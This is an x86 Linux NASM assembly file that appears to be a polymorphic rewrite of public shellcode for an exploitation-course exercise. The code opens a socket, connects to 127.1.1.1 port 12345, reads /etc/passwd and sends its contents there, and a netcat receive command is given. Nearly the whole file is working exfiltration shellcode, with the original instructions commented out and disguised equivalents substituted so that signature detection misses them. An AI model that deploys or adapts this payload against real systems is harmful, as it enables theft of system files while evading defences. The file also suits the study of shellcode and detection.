; poly-shellcode-861.nasm
; by Michael Born (@blu3gl0w13)
; Original Author: Daniel Sauder
; Original Authro Website: http://govolution.wordpress.com/about
; Original Author License http://creativecommons.org/licenses/by-sa/3.0/


; Original Author Description: 
; Shellcode reads /etc/passwd and sends the content to 127.1.1.1 port 12345. 
; The file can be recieved using netcat:
; $ nc -l 127.1.1.1 12345

section .text

global _start

_start:
    ; socket
;    push BYTE 0x66    ; socketcall 102
;    pop eax
;    xor ebx, ebx 
;    inc ebx 
;    xor edx, edx
;    push edx 
;    push BYTE 0x1
;    push BYTE 0x2
;    mov ecx, esp
;    int 0x80
;    mov esi, eax

    ;socket
    push BYTE 0x22
    push BYTE 0x44
    push BYTE 0x45
    pop ebx
    pop ecx
    pop eax

poly_sckt:
    inc eax
    dec ebx
    loop poly_sckt
    inc ecx
    push ecx
    inc ecx
    push ecx
    mov ecx, esp
    mov edi, eax
    int 0x80    
    mov esi, eax

    ; connect
;    push BYTE 0x66 
;    pop eax
;    inc ebx
;    push DWORD 0x0101017f  ;127.1.1.1
;    push WORD 0x3930  ; Port 12345
;    push WORD bx
;    mov ecx, esp
;    push BYTE 16
;    push ecx
;    push esi
;    mov ecx, esp
;    inc ebx
;    int 0x80

poly_connect:

    mov eax, edi
    add ebx, 0x1
    mov DWORD [esp - 4], 0x0101017f
    sub esp, 0x4
    mov WORD [esp - 4], 0x3930
    sub esp, 0x4
    add ebx, 0x1
    mov WORD [esp - 4], bx
    sub esp, 0x4
    mov ecx, esp
    mov BYTE [esp -4], 0x10
    sub esp, 0x4
    mov [esp - 4], ecx
    sub esp, 0x4
    push esi
    mov ecx, esp
    add ebx, 0x1
    int 0x80

    

    
    ; dup2
;    mov esi, eax
;    push BYTE 0x1
;    pop ecx
;    mov BYTE al, 0x3F
;    int 0x80

    mov esi, eax
    mov BYTE [esp - 4], 0x1
    sub esp, 0x4
    pop ecx
    push 0x3f
    pop eax


    ;read the file
    jmp short call_shellcode
    
shellcode:
;    push 0x5
;    pop eax
;    pop ebx
;    xor ecx,ecx
;    int 0x80
;    mov ebx,eax
;    mov al,0x3
;    mov edi,esp
;    mov ecx,edi
;    xor edx,edx
;    mov dh,0xff
;    mov dl,0xff
;    int 0x80
;    mov edx,eax
;    push 0x4
;    pop eax
;    mov bl, 0x1
;    int 0x80
;    push 0x1
;    pop eax
;    inc ebx
;    int 0x80


poly_shellcode:

    add ebx, 0x2
    mov dword [esp - 4], ebx
    sub esp, 0x4
    pop eax
    pop ebx
    push 0x1
    pop ecx
    dec ecx
    int 0x80
    mov ebx, eax
    push 0x3
    pop eax
    mov edi, esp
    mov ecx, esp
    mov WORD [esp - 4], 0xffff
    sub esp, 0x4
    pop edx
    int 0x80
    mov edx, eax
    mov BYTE [esp - 4], 0x4
    sub esp, 0x4
    pop eax
    push 0x1
    pop ebx
    int 0x80
    mov BYTE [esp -4], 0x1
    sub esp, 0x4
    pop eax
    inc ebx
    int 0x80


call_shellcode:
;    call shellcode
;    message db "/etc/passwd"

    call poly_shellcode
    message db "/etc/passwd"
